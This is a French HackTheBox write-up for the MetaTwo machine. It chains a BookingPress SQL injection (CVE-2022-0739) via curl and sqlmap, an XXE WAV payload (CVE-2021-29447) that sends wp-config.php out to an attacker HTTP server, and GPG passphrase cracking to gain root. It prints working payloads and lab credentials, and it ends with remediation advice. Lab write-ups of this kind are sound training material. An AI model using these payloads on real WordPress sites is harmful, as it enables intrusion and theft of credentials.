---
layout: post
title: "MetaTwo - HackTheBox WriteUp"
date: 2025-10-26
categories: [CTF, HackTheBox, WriteUp]
tags: [WordPress, SQLi, XXE, FTP, SSH, Passpie, GPG, CVE-2022-0739, CVE-2021-29447, Linux]
difficulty: Easy
platform: HackTheBox
author: Aubin SABY
lang: fr
permalink: /fr/blog/2022/10/30/metatwo-htb-writeup/
excerpt: "Machine Linux orientée Web Security combinant SQLi non authentifiée dans BookingPress, XXE dans WordPress, et escalade via Passpie/GPG."
---

<div class="bg-gradient-to-r from-green-500/10 to-cyan-500/10 p-10 rounded-xl mb-12 border-l-4 border-green-500 shadow-lg">
    <div class="flex flex-col md:flex-row items-start md:items-center justify-between mb-8 gap-6">
        <div class="flex-1">
            <h2 class="text-4xl md:text-5xl font-bold text-green-500 mb-3">
                <i class="fas fa-cube mr-3"></i>MetaTwo
            </h2>
            <p class="text-gray-700 dark:text-gray-300 text-lg md:text-xl">
                WordPress SQLi + XXE + Passpie GPG Privilege Escalation
            </p>
        </div>
        <div class="flex gap-3">
            <span class="px-5 py-2 bg-green-500 text-white rounded-lg text-sm font-semibold shadow-md">
                <i class="fas fa-circle text-xs mr-1"></i>Easy
            </span>
            <span class="px-5 py-2 bg-blue-500 text-white rounded-lg text-sm font-semibold shadow-md">
                <i class="fab fa-linux mr-1"></i>Linux
            </span>
        </div>
    </div>

    <div class="grid grid-cols-2 md:grid-cols-4 gap-6 mt-6">
        <div class="flex items-center gap-3">
            <div class="text-green-500 text-xl">
                <i class="fas fa-calendar"></i>
            </div>
            <div>
                <div class="text-xs uppercase tracking-wide text-gray-600 dark:text-gray-400">Date</div>
                <div class="font-semibold text-gray-800 dark:text-gray-100 text-lg">2025-10-26</div>
            </div>
        </div>

        <div class="flex items-center gap-3">
            <div class="text-blue-500 text-xl">
                <i class="fas fa-network-wired"></i>
            </div>
            <div>
                <div class="text-xs uppercase tracking-wide text-gray-600 dark:text-gray-400">IP</div>
                <div class="font-semibold text-gray-800 dark:text-gray-100 text-lg">10.10.11.186</div>
            </div>
        </div>

        <div class="flex items-center gap-3">
            <div class="text-purple-500 text-xl">
                <i class="fas fa-shield-alt"></i>
            </div>
            <div>
                <div class="text-xs uppercase tracking-wide text-gray-600 dark:text-gray-400">OS</div>
                <div class="font-semibold text-gray-800 dark:text-gray-100 text-lg">Debian 11</div>
            </div>
        </div>

        <div class="flex items-center gap-3">
            <div class="text-amber-500 text-xl">
                <i class="fas fa-star"></i>
            </div>
            <div>
                <div class="text-xs uppercase tracking-wide text-gray-600 dark:text-gray-400">Points</div>
                <div class="font-semibold text-gray-800 dark:text-gray-100 text-lg">20</div>
            </div>
        </div>
    </div>
</div>

## 🎯 Synopsis

**MetaTwo** est une machine <span class="text-highlight-green">**Linux de difficulté facile**</span> orientée <span class="text-highlight-blue">**Web Security**</span>, combinant plusieurs vulnérabilités liées à <span class="text-highlight-red">**WordPress**</span> et à ses composants.

L'exploitation débute avec une <span class="text-highlight-orange">**injection SQL non authentifiée (CVE-2022-0739)**</span> dans le plugin **BookingPress**, permettant de récupérer les mots de passe hachés des utilisateurs WordPress. Après connexion à l'interface d'administration, une <span class="text-highlight-purple">**attaque XXE (CVE-2021-29447)**</span> via la bibliothèque média permet d'extraire le fichier `wp-config.php` et d'obtenir des <span class="text-highlight-blue">**identifiants FTP**</span>. Le serveur FTP révèle un script PHP contenant le mot de passe SSH de l'utilisateur `jnelson`. Enfin, l'escalade de privilèges se fait via <span class="text-highlight-red">**Passpie**</span>, un gestionnaire de mots de passe utilisant GPG, dont la passphrase est crackée pour obtenir le <span class="text-highlight-green">**mot de passe root**</span>.

<div class="grid md:grid-cols-2 gap-6 my-4">
    <div class="bg-white dark:bg-dark-navbar p-6 rounded-xl shadow-lg border-l-4 border-portfolio-violet">
        <h3 class="text-2xl font-bold text-portfolio-violet mb-4">
            <i class="fas fa-brain mr-2"></i>Compétences requises
        </h3>
        <ul class="space-y-2 text-gray-700 dark:text-gray-300">
            <li><i class="fas fa-check-circle text-green-500 mr-2"></i>Connaissance de base en Linux et WordPress</li>
            <li><i class="fas fa-check-circle text-green-500 mr-2"></i>Familiarité avec SQLi et XXE</li>
            <li><i class="fas fa-check-circle text-green-500 mr-2"></i>Analyse de scripts PHP</li>
            <li><i class="fas fa-check-circle text-green-500 mr-2"></i>Compréhension de GPG et gestionnaires de mots de passe</li>
        </ul>
    </div>
    <div class="bg-white dark:bg-dark-navbar p-6 rounded-xl shadow-lg border-l-4 border-cyan-500">
        <h3 class="text-2xl font-bold text-cyan-500 mb-4">
            <i class="fas fa-rocket mr-2"></i>Compétences acquises
        </h3>
        <ul class="space-y-2 text-gray-700 dark:text-gray-300">
            <li><i class="fas fa-star text-amber-500 mr-2"></i>Exploitation de plugin WordPress (BookingPress)</li>
            <li><i class="fas fa-star text-amber-500 mr-2"></i>Injection SQL avancée via sqlmap</li>
            <li><i class="fas fa-star text-amber-500 mr-2"></i>Attaque XXE et exfiltration de fichiers</li>
            <li><i class="fas fa-star text-amber-500 mr-2"></i>Déchiffrement de clés GPG avec John</li>
        </ul>
    </div>
</div>



## 🔍 Phase 1 — Reconnaissance réseau

### Scan de ports initial

On commence par un scan rapide de tous les ports TCP pour identifier les services exposés :

```bash
nmap -p- --min-rate=1000 -T4 10.10.11.186
```

### Énumération détaillée des services

Une fois les ports ouverts identifiés, on effectue un scan approfondi avec détection de version et scripts NSE :

```bash
ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.186 | grep '^[0-9]' | cut -d'/' -f1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -sC -sV 10.10.11.186
```

<div class="bg-white dark:bg-dark-navbar p-5 rounded-xl shadow-lg my-4">
    <h4 class="text-xl font-bold mb-4 text-portfolio-violet flex items-center">
        <i class="fas fa-search mr-2"></i>Résultats du scan
    </h4>
    <div class="space-y-3">
        <div class="flex items-start gap-4 p-4 bg-blue-50 dark:bg-blue-900/20 rounded-lg border-l-4 border-blue-500">
            <div class="text-3xl text-blue-500">
                <i class="fas fa-network-wired"></i>
            </div>
            <div class="flex-1">
                <div class="font-bold text-lg text-blue-600 dark:text-blue-400">Port 21/TCP - FTP</div>
                <div class="text-gray-600 dark:text-gray-400 text-sm mt-1">ProFTPD</div>
                <div class="text-xs text-gray-500 dark:text-gray-500 mt-2">Service de transfert de fichiers</div>
            </div>
        </div>
        <div class="flex items-start gap-4 p-4 bg-blue-50 dark:bg-blue-900/20 rounded-lg border-l-4 border-blue-500">
            <div class="text-3xl text-blue-500">
                <i class="fas fa-network-wired"></i>
            </div>
            <div class="flex-1">
                <div class="font-bold text-lg text-blue-600 dark:text-blue-400">Port 22/TCP - SSH</div>
                <div class="text-gray-600 dark:text-gray-400 text-sm mt-1">OpenSSH 8.4p1 Debian</div>
                <div class="text-xs text-gray-500 dark:text-gray-500 mt-2">Service d'administration à distance sécurisé</div>
            </div>
        </div>
        <div class="flex items-start gap-4 p-4 bg-green-50 dark:bg-green-900/20 rounded-lg border-l-4 border-green-500">
            <div class="text-3xl text-green-500">
                <i class="fas fa-globe"></i>
            </div>
            <div class="flex-1">
                <div class="font-bold text-lg text-green-600 dark:text-green-400">Port 80/TCP - HTTP</div>
                <div class="text-gray-600 dark:text-gray-400 text-sm mt-1">nginx 1.18.0</div>
                <div class="text-xs text-gray-500 dark:text-gray-500 mt-2">Serveur web hébergeant l'application cible</div>
            </div>
        </div>
    </div>
</div>

<div class="bg-cyan-100 dark:bg-cyan-900/20 border-l-4 border-cyan-500 p-4 my-4 rounded-r-lg">
    <p class="text-cyan-800 dark:text-cyan-200">
        <i class="fas fa-lightbulb mr-2 text-cyan-500"></i>
        <strong>Point d'entrée identifié :</strong> Le service web sur le port 80 constitue le vecteur d'attaque initial le plus probable.
    </p>
</div>


## 🌐 Phase 2 — Analyse Web (WordPress)

### Configuration du domaine

Le site redirige vers `metapress.htb`. On l'ajoute au fichier `/etc/hosts` :

```bash
echo "10.10.11.186 metapress.htb" | sudo tee -a /etc/hosts
```

### Énumération WordPress

Navigation vers `http://metapress.htb` révèle un site WordPress avec une section **Events**. L'analyse du code source HTML révèle le plugin **BookingPress 1.0.10**.

<div class="bg-white dark:bg-dark-navbar p-6 rounded-xl shadow-lg my-4 border-l-4 border-red-500">
    <div class="flex items-start gap-4 mb-4">
        <div class="text-4xl text-red-500">
            <i class="fas fa-plug"></i>
        </div>
        <div class="flex-1">
            <h4 class="text-xl font-bold text-gray-800 dark:text-gray-200">BookingPress 1.0.10</h4>
            <p class="text-gray-600 dark:text-gray-400">Plugin WordPress vulnérable</p>
        </div>
    </div>
    <p class="text-gray-700 dark:text-gray-300">
        Ce plugin est vulnérable à une <strong>injection SQL non authentifiée</strong> (CVE-2022-0739), permettant d'extraire des données sensibles de la base de données WordPress.
    </p>
</div>



## 💉 Phase 3 — Exploitation BookingPress (CVE-2022-0739)

### Recherche de vulnérabilités

Une recherche rapide révèle la vulnérabilité <span class="text-highlight-orange">**CVE-2022-0739**</span>, permettant une injection SQL non authentifiée.

<div class="bg-red-50 dark:bg-red-900/20 p-6 rounded-xl border-l-4 border-red-500 my-4">
    <h4 class="text-xl font-bold text-red-600 dark:text-red-400 mb-3 flex items-center">
        <i class="fas fa-bug mr-2"></i>CVE-2022-0739 - SQL Injection
    </h4>
    <div class="space-y-2 text-gray-700 dark:text-gray-300">
        <div class="grid md:grid-cols-2 gap-4">
            <div>
                <span class="font-semibold text-red-600 dark:text-red-400">Plugin affecté :</span> BookingPress < 1.0.11
            </div>
            <div>
                <span class="font-semibold text-red-600 dark:text-red-400">Type :</span> SQL Injection (Unauthenticated)
            </div>
        </div>
        <div>
            <span class="font-semibold text-red-600 dark:text-red-400">CVSS Score :</span> 9.8 (Critical)
        </div>
        <div class="mt-4">
            <span class="font-semibold text-red-600 dark:text-red-400">Description :</span><br>
            Le paramètre <code>total_service</code> dans l'action <code>bookingpress_front_get_category_services</code> n'est pas correctement sanitisé, permettant une injection SQL sans authentification.
        </div>
    </div>
</div>

### Vérification manuelle

Récupération du nonce depuis le code source de la page Events, puis test de l'injection :

```bash
curl -i 'http://metapress.htb/wp-admin/admin-ajax.php' \
--data 'action=bookingpress_front_get_category_services&_wpnonce=60646b11e1&category_id=123&total_service=111) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -'
```

<div class="bg-green-100 dark:bg-green-900/20 border-l-4 border-green-500 p-4 my-4 rounded-r-lg">
    <p class="text-green-800 dark:text-green-200">
        <i class="fas fa-check-circle mr-2 text-green-500"></i>
        <strong>Résultat :</strong> Injection SQL confirmée \!
    </p>
</div>

### Exploitation avec sqlmap

```bash
sqlmap -u "http://metapress.htb/wp-admin/admin-ajax.php" --method POST \
--data "action=bookingpress_front_get_category_services&_wpnonce=60646b11e1&category_id=123&total_service=111" \
-p total_service --level=5 --risk=3 --dbs
```

**Bases de données découvertes :** `information_schema` et `blog`

### Extraction des utilisateurs WordPress

```bash
sqlmap -D blog -T wp_users --dump
```

**Credentials récupérés :**

```
admin:$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.
manager:$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70
```

### Crackage des mots de passe

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt wp_users.hash
```

<div class="bg-green-100 dark:bg-green-900/20 border-l-4 border-green-500 p-4 my-4 rounded-r-lg">
    <p class="text-green-800 dark:text-green-200 font-bold text-lg">
        <i class="fas fa-key mr-2 text-green-500"></i>
        Mot de passe trouvé : manager:partylikearockstar
    </p>
</div>

Connexion réussie à `/wp-login` avec le compte `manager`.


## 🧩 Phase 4 — Exploitation WordPress (XXE, CVE-2021-29447)

### Identification de la version WordPress

**Version détectée :** WordPress 5.6.2 sous PHP 8.0.24

### Recherche de vulnérabilités

Une recherche rapide révèle la vulnérabilité <span class="text-highlight-orange">**CVE-2021-29447**</span>, permettant une attaque XXE via la Media Library.

<div class="bg-red-50 dark:bg-red-900/20 p-6 rounded-xl border-l-4 border-red-500 my-4">
    <h4 class="text-xl font-bold text-red-600 dark:text-red-400 mb-3 flex items-center">
        <i class="fas fa-bug mr-2"></i>CVE-2021-29447 - XXE Injection
    </h4>
    <div class="space-y-2 text-gray-700 dark:text-gray-300">
        <div class="grid md:grid-cols-2 gap-4">
            <div>
                <span class="font-semibold text-red-600 dark:text-red-400">Application affectée :</span> WordPress < 5.6.2
            </div>
            <div>
                <span class="font-semibold text-red-600 dark:text-red-400">Type :</span> XXE Injection (Authenticated)
            </div>
        </div>
        <div>
            <span class="font-semibold text-red-600 dark:text-red-400">CVSS Score :</span> 7.1 (High)
        </div>
        <div class="mt-4">
            <span class="font-semibold text-red-600 dark:text-red-400">Description :</span><br>
            La fonction de parsing de fichiers audio WAV dans WordPress ne valide pas correctement les entités XML. Un attaquant authentifié peut uploader un fichier WAV malveillant contenant des entités externes XML pour lire des fichiers arbitraires sur le serveur.
        </div>
    </div>
</div>

### Création du payload XXE

**Fichier evil.dtd :**

```xml
<\!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=../wp-config.php">
<\!ENTITY % init "<\!ENTITY &#x25; trick SYSTEM 'http://10.10.14.50:8080/?p=%file;'>">
```

**Fichier payload.wav :**

```bash
echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><\!DOCTYPE ANY[<\!ENTITY % remote SYSTEM "http://10.10.14.50:8080/evil.dtd">%remote;%init;%trick;]>\x00' > payload.wav
```

### Démarrage du serveur HTTP

```bash
python3 -m http.server 8080
```

### Upload du fichier malveillant

1. Connexion à WordPress avec le compte `manager`
2. Upload de `payload.wav` dans la Media Library
3. Le serveur effectue une requête HTTP contenant le contenu base64 du fichier

**Décodage du résultat :**

```bash
echo "BASE64_CONTENT" | base64 -d
```

**Credentials FTP extraits de wp-config.php :**

```php
define('FTP_USER', 'metapress.htb');
define('FTP_PASS', '9NYS_ii@FyL_p5M2NvJ');
define('FTP_HOST', 'ftp.metapress.htb');
```

<div class="bg-blue-100 dark:bg-blue-900/20 border-l-4 border-blue-500 p-4 my-4 rounded-r-lg">
    <p class="text-blue-800 dark:text-blue-200">
        <i class="fas fa-database mr-2 text-blue-500"></i>
        <strong>Credentials FTP obtenus \!</strong> Accès au serveur FTP possible.
    </p>
</div>



## 📂 Phase 5 — Accès FTP et découverte SSH

### Connexion FTP

```bash
ftp 10.10.11.186
# Login: metapress.htb
# Password: 9NYS_ii@FyL_p5M2NvJ
```

### Énumération des fichiers

```bash
ftp> ls -la
ftp> cd mailer
ftp> get send_email.php
```

### Analyse du fichier send_email.php

```php
$mail->Username = "jnelson@metapress.htb";
$mail->Password = "Cb4_JmWM8zUZWMu@Ys";
```

<div class="bg-purple-100 dark:bg-purple-900/20 border-l-4 border-purple-500 p-4 my-4 rounded-r-lg">
    <p class="text-purple-800 dark:text-purple-200">
        <i class="fas fa-unlock-alt mr-2 text-purple-500"></i>
        <strong>Credentials SSH découverts \!</strong> Tentative de connexion avec jnelson.
    </p>
</div>


## 🔑 Phase 6 — Accès SSH et user flag

### Connexion SSH

```bash
ssh jnelson@10.10.11.186
# Password: Cb4_JmWM8zUZWMu@Ys
```

<div class="bg-green-100 dark:bg-green-900/20 border-l-4 border-green-500 p-4 my-4 rounded-r-lg">
    <p class="text-green-800 dark:text-green-200 font-bold text-lg">
        <i class="fas fa-terminal mr-2 text-green-500"></i>
        Connexion SSH réussie en tant que jnelson \!
    </p>
</div>

### Récupération du user flag

```bash
cat ~/user.txt
```

<div class="bg-green-100 dark:bg-green-900/20 border-l-4 border-green-500 p-4 my-4 rounded-r-lg">
    <p class="text-green-800 dark:text-green-200">
        <i class="fas fa-flag mr-2 text-green-500"></i>
        <strong>USER FLAG OBTENU \!</strong> Première étape complétée.
    </p>
</div>


## 🔐 Phase 7 — Énumération locale (Passpie)

### Découverte de Passpie

```bash
ls -la ~
```

**Découverte :** Répertoire `.passpie` présent dans le home de jnelson.

<div class="bg-cyan-100 dark:bg-cyan-900/20 border-l-4 border-cyan-500 p-4 my-4 rounded-r-lg">
    <p class="text-cyan-800 dark:text-cyan-200">
        <i class="fas fa-info-circle mr-2 text-cyan-500"></i>
        <strong>Qu'est-ce que Passpie ?</strong> Gestionnaire de mots de passe en ligne de commande utilisant GPG pour le chiffrement.
    </p>
</div>

### Analyse de la configuration

```bash
ls -la ~/.passpie
cat ~/.passpie/.keys
```

Présence de clés GPG privées et publiques protégées par une passphrase.


## 🔓 Phase 8 — Escalade de privilèges via Passpie

### Extraction et crackage de la clé GPG

**Transfert des clés sur la machine locale :**

```bash
scp jnelson@10.10.11.186:/home/jnelson/.passpie/.keys ./keys
```

**Extraction du hash avec gpg2john :**

```bash
gpg2john keys > keys.hash
```

**Crackage avec John the Ripper :**

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt keys.hash --format=gpg
```

<div class="bg-green-100 dark:bg-green-900/20 border-l-4 border-green-500 p-4 my-4 rounded-r-lg">
    <p class="text-green-800 dark:text-green-200 font-bold text-lg">
        <i class="fas fa-key mr-2 text-green-500"></i>
        Passphrase trouvée : blink182
    </p>
</div>

### Export des mots de passe Passpie

```bash
passpie export ~/password.db
# Passphrase: blink182

cat ~/password.db
```

**Résultat :**

```
credentials:
- comment: ''
  fullname: root@ssh
  login: root
  modified: 2022-06-26 08:58:15.621572
  name: ssh
  password: \!\!python/unicode 'p7qfAZt4_A1xo_0x'
```

### Connexion root

```bash
su root
# Password: p7qfAZt4_A1xo_0x
```

<div class="bg-gray-100 dark:bg-gray-800 p-4 rounded-lg my-4 font-mono text-sm">
    <div class="text-gray-700 dark:text-gray-300">
        uid=0(root) gid=0(root) groups=0(root)
    </div>
</div>

<div class="bg-green-100 dark:bg-green-900/20 border-l-4 border-green-500 p-4 my-4 rounded-r-lg">
    <p class="text-green-800 dark:text-green-200">
        <i class="fas fa-crown mr-2 text-amber-500"></i>
        <strong>ROOT SHELL OBTENU \!</strong> Privilèges maximum atteints.
    </p>
</div>



## 🏁 Phase 9 — Extraction des flags

### Récupération du root flag

Avec l'accès root, nous pouvons maintenant récupérer le root flag :

```bash
cat /root/root.txt
```

<div class="bg-gradient-to-r from-amber-500/10 to-yellow-500/10 p-6 rounded-xl border-l-4 border-amber-500 my-4">
    <div class="flex items-center gap-4">
        <div class="text-5xl text-amber-500">
            <i class="fas fa-trophy"></i>
        </div>
        <div class="flex-1">
            <h4 class="text-2xl font-bold text-amber-600 dark:text-amber-400 mb-2">Machine Pwned\!</h4>
            <p class="text-gray-700 dark:text-gray-300">
                <i class="fas fa-flag text-green-500 mr-2"></i><strong>User flag :</strong> /home/jnelson/user.txt<br>
                <i class="fas fa-flag text-red-500 mr-2"></i><strong>Root flag :</strong> /root/root.txt
            </p>
        </div>
    </div>
</div>


## 📋 Phase 10 — Recommandations et remédiations

<div class="grid md:grid-cols-2 gap-6 my-4">
    <div class="bg-white dark:bg-dark-navbar p-5 rounded-xl shadow-lg border-l-4 border-red-500">
        <h4 class="text-xl font-bold text-red-600 dark:text-red-400 mb-4 flex items-start">
            <i class="fas fa-globe mr-2 mt-1"></i><span>Application</span>
        </h4>
        <ul class="space-y-3 text-gray-700 dark:text-gray-300">
            <li class="flex items-start gap-2">
                <i class="fas fa-check text-green-500 mt-1"></i>
                <span>Mettre à jour WordPress et tous les plugins vers les dernières versions</span>
            </li>
            <li class="flex items-start gap-2">
                <i class="fas fa-check text-green-500 mt-1"></i>
                <span>Désactiver l'upload de fichiers XML/WAV dans la Media Library</span>
            </li>
            <li class="flex items-start gap-2">
                <i class="fas fa-check text-green-500 mt-1"></i>
                <span>Valider et filtrer tous les inputs utilisateur</span>
            </li>
            <li class="flex items-start gap-2">
                <i class="fas fa-check text-green-500 mt-1"></i>
                <span>Utiliser un WAF pour détecter les tentatives d'injection</span>
            </li>
        </ul>
    </div>
    <div class="bg-white dark:bg-dark-navbar p-5 rounded-xl shadow-lg border-l-4 border-blue-500">
        <h4 class="text-xl font-bold text-blue-600 dark:text-blue-400 mb-4 flex items-start">
            <i class="fas fa-server mr-2 mt-1"></i><span>Système</span>
        </h4>
        <ul class="space-y-3 text-gray-700 dark:text-gray-300">
            <li class="flex items-start gap-2">
                <i class="fas fa-check text-green-500 mt-1"></i>
                <span>Ne jamais stocker de credentials dans des fichiers accessibles (FTP, Git)</span>
            </li>
            <li class="flex items-start gap-2">
                <i class="fas fa-check text-green-500 mt-1"></i>
                <span>Utiliser des clés GPG robustes avec passphrases complexes</span>
            </li>
            <li class="flex items-start gap-2">
                <i class="fas fa-check text-green-500 mt-1"></i>
                <span>Restreindre l'accès FTP et auditer régulièrement les fichiers</span>
            </li>
            <li class="flex items-start gap-2">
                <i class="fas fa-check text-green-500 mt-1"></i>
                <span>Implémenter une rotation régulière des mots de passe</span>
            </li>
        </ul>
    </div>
</div>

---


## 📝 Récapitulatif des commandes

### 🔍 Phase 1 : Reconnaissance réseau

```bash
# 1. Scan de ports complet
nmap -p- --min-rate=1000 -T4 10.10.11.186

# 2. Scan détaillé des services
nmap -p21,22,80 -sC -sV 10.10.11.186

# 3. Configuration DNS
echo "10.10.11.186 metapress.htb" | sudo tee -a /etc/hosts
```

### 💉 Phase 2 : Exploitation SQLi (CVE-2022-0739)

```bash
# 1. Test manuel de l'injection (récupérer le nonce depuis la page Events)
curl -i 'http://metapress.htb/wp-admin/admin-ajax.php' \
--data 'action=bookingpress_front_get_category_services&_wpnonce=60646b11e1&category_id=123&total_service=111) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -'

# 2. Extraction automatisée avec sqlmap
sqlmap -u "http://metapress.htb/wp-admin/admin-ajax.php" --method POST \
--data "action=bookingpress_front_get_category_services&_wpnonce=60646b11e1&category_id=123&total_service=111" \
-p total_service --level=5 --risk=3 --dbs

# 3. Dump des utilisateurs WordPress
sqlmap -D blog -T wp_users --dump

# 4. Crackage des mots de passe
john --wordlist=/usr/share/wordlists/rockyou.txt wp_users.hash
# → Résultat: manager:partylikearockstar
```

### 🧩 Phase 3 : Exploitation XXE (CVE-2021-29447)

```bash
# 1. Créer le fichier evil.dtd
echo '<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=../wp-config.php">
<!ENTITY % init "<!ENTITY &#x25; trick SYSTEM '"'"'http://10.10.14.50:8080/?p=%file;'"'"'>">' > evil.dtd

# 2. Créer le payload WAV malveillant
echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM "http://10.10.14.50:8080/evil.dtd">%remote;%init;%trick;]>\x00' > payload.wav

# 3. Démarrer le serveur HTTP
python3 -m http.server 8080

# 4. Upload payload.wav dans WordPress Media Library
# → Connexion avec manager:partylikearockstar
# → Upload via Media > Add New

# 5. Décoder le résultat base64
echo "BASE64_CONTENT" | base64 -d
# → Résultat: metapress.htb / 9NYS_ii@FyL_p5M2NvJ
```

### 📂 Phase 4 : Accès FTP et pivoting SSH

```bash
# 1. Connexion FTP
ftp 10.10.11.186
# Login: metapress.htb
# Password: 9NYS_ii@FyL_p5M2NvJ

# 2. Énumération et téléchargement
ls -la
cd mailer
get send_email.php
exit

# 3. Analyse du fichier
cat send_email.php
# → Résultat: jnelson / Cb4_JmWM8zUZWMu@Ys

# 4. Connexion SSH
ssh jnelson@10.10.11.186
# Password: Cb4_JmWM8zUZWMu@Ys

# 5. Récupération du user flag
cat ~/user.txt
```

### 🔓 Phase 5 : Escalade de privilèges via Passpie

```bash
# 1. Énumération locale
ls -la ~
# → Découverte de .passpie/

# 2. Transfert des clés GPG
scp jnelson@10.10.11.186:/home/jnelson/.passpie/.keys ./keys

# 3. Extraction du hash GPG
gpg2john keys > keys.hash

# 4. Crackage de la passphrase
john --wordlist=/usr/share/wordlists/rockyou.txt keys.hash --format=gpg
# → Résultat: blink182
```

### 👑 Phase 6 : Obtention du root (sur la machine cible)

```bash
# 1. Export des mots de passe Passpie
passpie export ~/password.db
# Passphrase: blink182

# 2. Lecture du fichier exporté
cat ~/password.db
# → root password: p7qfAZt4_A1xo_0x

# 3. Connexion root
su root
# Password: p7qfAZt4_A1xo_0x

# 4. Récupération du root flag
cat /root/root.txt
```

---

## 🔗 Attack Chain Summary

<div class="bg-white dark:bg-dark-navbar px-6 py-5 rounded-xl shadow-lg my-8">
    <h3 class="text-2xl font-bold text-portfolio-violet mb-4 flex items-center">
        <i class="fas fa-sitemap mr-3"></i>Chaîne d'attaque résumée
    </h3>
    <div class="space-y-4">
        <div class="flex items-start gap-4 p-4 bg-blue-50 dark:bg-blue-900/20 rounded-lg border-l-4 border-blue-500">
            <div class="text-3xl font-bold text-blue-500 mt-1">1</div>
            <div class="flex-1">
                <div class="font-bold text-blue-600 dark:text-blue-400">Reconnaissance et énumération</div>
                <div class="text-sm text-gray-600 dark:text-gray-400">Nmap → WordPress → BookingPress 1.0.10</div>
            </div>
        </div>
        <div class="flex items-start gap-4 p-4 bg-green-50 dark:bg-green-900/20 rounded-lg border-l-4 border-green-500">
            <div class="text-3xl font-bold text-green-500 mt-1">2</div>
            <div class="flex-1">
                <div class="font-bold text-green-600 dark:text-green-400">Exploitation SQLi et XXE</div>
                <div class="text-sm text-gray-600 dark:text-gray-400">CVE-2022-0739 → WordPress creds → CVE-2021-29447 → FTP creds</div>
            </div>
        </div>
        <div class="flex items-start gap-4 p-4 bg-purple-50 dark:bg-purple-900/20 rounded-lg border-l-4 border-purple-500">
            <div class="text-3xl font-bold text-purple-500 mt-1">3</div>
            <div class="flex-1">
                <div class="font-bold text-purple-600 dark:text-purple-400">Pivot FTP vers SSH</div>
                <div class="text-sm text-gray-600 dark:text-gray-400">FTP access → send_email.php → SSH jnelson</div>
            </div>
        </div>
        <div class="flex items-start gap-4 p-4 bg-red-50 dark:bg-red-900/20 rounded-lg border-l-4 border-red-500">
            <div class="text-3xl font-bold text-red-500 mt-1">4</div>
            <div class="flex-1">
                <div class="font-bold text-red-600 dark:text-red-400">Escalade de privilèges</div>
                <div class="text-sm text-gray-600 dark:text-gray-400">Passpie → GPG cracking → Root password → Root shell</div>
            </div>
        </div>
    </div>
</div>

---


## 🏷️ Tags & Références

<div class="flex flex-wrap gap-2 my-4" style="line-height: 1.5;">
    <span style="display: inline-block; padding: 0.25rem 0.5rem; background-color: rgba(59, 130, 246, 0.1); color: #3b82f6; border-radius: 0.25rem; font-size: 0.75rem; font-weight: 600;">WordPress</span>
    <span style="display: inline-block; padding: 0.25rem 0.5rem; background-color: rgba(239, 68, 68, 0.1); color: #ef4444; border-radius: 0.25rem; font-size: 0.75rem; font-weight: 600;">SQLi</span>
    <span style="display: inline-block; padding: 0.25rem 0.5rem; background-color: rgba(249, 115, 22, 0.1); color: #f97316; border-radius: 0.25rem; font-size: 0.75rem; font-weight: 600;">XXE</span>
    <span style="display: inline-block; padding: 0.25rem 0.5rem; background-color: rgba(168, 85, 247, 0.1); color: #a855f7; border-radius: 0.25rem; font-size: 0.75rem; font-weight: 600;">FTP</span>
    <span style="display: inline-block; padding: 0.25rem 0.5rem; background-color: rgba(34, 197, 94, 0.1); color: #22c55e; border-radius: 0.25rem; font-size: 0.75rem; font-weight: 600;">SSH</span>
    <span style="display: inline-block; padding: 0.25rem 0.5rem; background-color: rgba(99, 102, 241, 0.1); color: #6366f1; border-radius: 0.25rem; font-size: 0.75rem; font-weight: 600;">Passpie</span>
    <span style="display: inline-block; padding: 0.25rem 0.5rem; background-color: rgba(236, 72, 153, 0.1); color: #ec4899; border-radius: 0.25rem; font-size: 0.75rem; font-weight: 600;">GPG</span>
    <span style="display: inline-block; padding: 0.25rem 0.5rem; background-color: rgba(14, 165, 233, 0.1); color: #0ea5e9; border-radius: 0.25rem; font-size: 0.75rem; font-weight: 600;">CVE-2022-0739</span>
    <span style="display: inline-block; padding: 0.25rem 0.5rem; background-color: rgba(245, 158, 11, 0.1); color: #f59e0b; border-radius: 0.25rem; font-size: 0.75rem; font-weight: 600;">CVE-2021-29447</span>
    <span style="display: inline-block; padding: 0.25rem 0.5rem; background-color: rgba(107, 114, 128, 0.1); color: #6b7280; border-radius: 0.25rem; font-size: 0.75rem; font-weight: 600;">Linux</span>
    <span style="display: inline-block; padding: 0.25rem 0.5rem; background-color: rgba(6, 182, 212, 0.1); color: #06b6d4; border-radius: 0.25rem; font-size: 0.75rem; font-weight: 600;">HackTheBox</span>
</div>

<div class="bg-white dark:bg-dark-navbar p-6 rounded-xl shadow-lg my-4">
    <h4 class="text-lg font-bold mb-4 text-portfolio-violet flex items-center">
        <i class="fas fa-link mr-2"></i>Références utiles
    </h4>
    <ul class="space-y-2 text-gray-700 dark:text-gray-300">
        <li>
            <a href="https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357" target="_blank" class="text-blue-600 dark:text-blue-400 hover:underline flex items-center gap-2">
                <i class="fas fa-external-link-alt text-xs"></i>
                CVE-2022-0739 - BookingPress SQLi
            </a>
        </li>
        <li>
            <a href="https://blog.wpsec.com/wordpress-xxe-in-media-library-cve-2021-29447/" target="_blank" class="text-blue-600 dark:text-blue-400 hover:underline flex items-center gap-2">
                <i class="fas fa-external-link-alt text-xs"></i>
                CVE-2021-29447 - WordPress XXE
            </a>
        </li>
        <li>
            <a href="https://passpie.readthedocs.io/" target="_blank" class="text-blue-600 dark:text-blue-400 hover:underline flex items-center gap-2">
                <i class="fas fa-external-link-alt text-xs"></i>
                Passpie Documentation
            </a>
        </li>
    </ul>
</div>

---

<div class="text-center my-12">
